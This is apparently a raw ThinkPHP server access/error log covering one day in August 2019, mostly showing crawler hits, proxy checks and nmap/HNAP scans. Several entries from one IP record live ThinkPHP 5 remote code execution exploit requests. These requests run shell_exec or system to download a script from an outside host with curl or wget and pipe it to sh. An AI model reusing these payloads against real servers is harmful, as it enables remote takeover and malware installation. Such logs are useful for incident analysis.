[ 2019-08-21T00:21:39+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000365s ]

[ 2019-08-21T03:05:02+08:00 ] 95.213.177.124 http://check.proxyradar.com/azenv.php?auth=156632790273&a=PSCN&i=660622854&p=80
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000364s ]
ERR: 无法加载模块:Azenv

[ 2019-08-21T04:59:34+08:00 ] 71.6.146.185 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000318s ]
ERR: 无法加载模块:Robots

[ 2019-08-21T04:59:34+08:00 ] 71.6.146.185 /sitemap.xml
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000342s ]
ERR: 无法加载模块:Sitemap

[ 2019-08-21T04:59:34+08:00 ] 71.6.146.185 /.well-known/security.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000308s ]
ERR: 无法加载模块:.well-known

[ 2019-08-21T04:59:35+08:00 ] 71.6.146.185 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000312s ]

[ 2019-08-21T08:31:10+08:00 ] 124.90.49.20 http://www.rfa.org/english/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000312s ]
ERR: 无法加载模块:English

[ 2019-08-21T08:42:17+08:00 ] 66.249.65.107 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000368s ]
ERR: 无法加载模块:Robots

[ 2019-08-21T10:24:29+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000372s ]

[ 2019-08-21T10:50:02+08:00 ] 35.184.207.166 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000354s ]
ERR: 无法加载模块:Robots

[ 2019-08-21T11:07:22+08:00 ] 112.32.169.187 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000351s ]

[ 2019-08-21T11:07:33+08:00 ] 61.151.178.172 /public/home/js/jquery.cookie.js
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000318s ]
ERR: 无法加载模块:Public

[ 2019-08-21T13:09:18+08:00 ] 134.119.8.163 /tp5/public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=(curl%20-fsSL%20-m180%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22%7C%7Cwget%20-q%20-T180%20-O-%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22)%7Csh
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000333s ]
ERR: 无法加载模块:Index

[ 2019-08-21T13:09:23+08:00 ] 134.119.8.163 /tp5/public/index.php?s=captcha
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000320s ]
ERR: 无法加载模块:Captcha

[ 2019-08-21T13:09:26+08:00 ] 134.119.8.163 /tp5/public/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000315s ]
ERR: 无法加载模块:Tp5

[ 2019-08-21T13:09:31+08:00 ] 134.119.8.163 /thinkphp/public/index.php?s=captcha
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000311s ]
ERR: 无法加载模块:Captcha

[ 2019-08-21T13:09:34+08:00 ] 134.119.8.163 /thinkphp/public/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000316s ]
ERR: 无法加载模块:ThinkPHP

[ 2019-08-21T13:09:37+08:00 ] 134.119.8.163 /thinkphp/public/index.php?s=index/index/index
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000309s ]
ERR: 无法加载模块:Index

[ 2019-08-21T13:09:39+08:00 ] 134.119.8.163 /thinkphp/public/?s=index/%09hink%5CRequest/input&filter=system&data=(curl%20-fsSL%20-m180%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22%7C%7Cwget%20-q%20-T180%20-O-%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22)%7Csh
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
ERR: 无法加载模块:Index

[ 2019-08-21T13:09:42+08:00 ] 134.119.8.163 /thinkphp_5.0.21/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=(curl%20-fsSL%20-m180%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22%7C%7Cwget%20-q%20-T180%20-O-%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22)%7Csh
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
ERR: 无法加载模块:Index

[ 2019-08-21T13:09:45+08:00 ] 134.119.8.163 /thinkphp_5.0.21/index.php?s=captcha
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000308s ]
ERR: 无法加载模块:Captcha

[ 2019-08-21T13:09:47+08:00 ] 134.119.8.163 /thinkphp_5.0.21/index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000376s ]
ERR: 无法加载模块:Thinkphp_5.0.21

[ 2019-08-21T13:09:50+08:00 ] 134.119.8.163 /thinkphp_5.0.21/index.php?s=index/index/index
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000318s ]
ERR: 无法加载模块:Index

[ 2019-08-21T13:09:52+08:00 ] 134.119.8.163 /thinkphp_5.0.21/?s=index/%09hink%5CRequest/input&filter=system&data=(curl%20-fsSL%20-m180%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22%7C%7Cwget%20-q%20-T180%20-O-%20%22http://dl.djangocc.com:8080/p?a=p&c=thinkphp_1%22)%7Csh
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000331s ]
ERR: 无法加载模块:Index

[ 2019-08-21T14:33:30+08:00 ] 120.220.13.171 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000358s ]

[ 2019-08-21T14:33:32+08:00 ] 58.246.221.160 /public/215415
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000327s ]
ERR: 无法加载模块:Public

[ 2019-08-21T15:28:25+08:00 ] 210.52.224.216 /nmaplowercheck1566372505
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000427s ]
ERR: 无法加载模块:Nmaplowercheck1566372505

[ 2019-08-21T15:28:25+08:00 ] 210.52.224.216 /sdk
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000470s ]
ERR: 无法加载模块:Sdk

[ 2019-08-21T15:28:25+08:00 ] 210.52.224.216 /sdk
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000430s ]
ERR: 无法加载模块:Sdk

[ 2019-08-21T15:28:25+08:00 ] 210.52.224.216 /nmaplowercheck1566372505
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000479s ]
ERR: 无法加载模块:Nmaplowercheck1566372505

[ 2019-08-21T15:28:26+08:00 ] 210.52.224.216 /HNAP1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000365s ]
ERR: 无法加载模块:HNAP1

[ 2019-08-21T15:28:26+08:00 ] 210.52.224.216 /evox/about
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000310s ]
ERR: 无法加载模块:Evox

[ 2019-08-21T15:28:26+08:00 ] 210.52.224.216 /evox/about
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000339s ]
ERR: 无法加载模块:Evox

[ 2019-08-21T15:28:26+08:00 ] 210.52.224.216 /HNAP1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000365s ]
ERR: 无法加载模块:HNAP1

[ 2019-08-21T20:29:05+08:00 ] 80.82.70.187 http://www.baidu.com/cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000355s ]

[ 2019-08-21T20:45:28+08:00 ] 95.213.177.123 http://check.proxyradar.com/azenv.php?auth=156639152893&a=PSCN&i=660622854&p=80
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000370s ]
ERR: 无法加载模块:Azenv

[ 2019-08-21T22:16:34+08:00 ] 35.241.161.11 /cm/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000379s ]
ERR: 无法加载模块:Cm

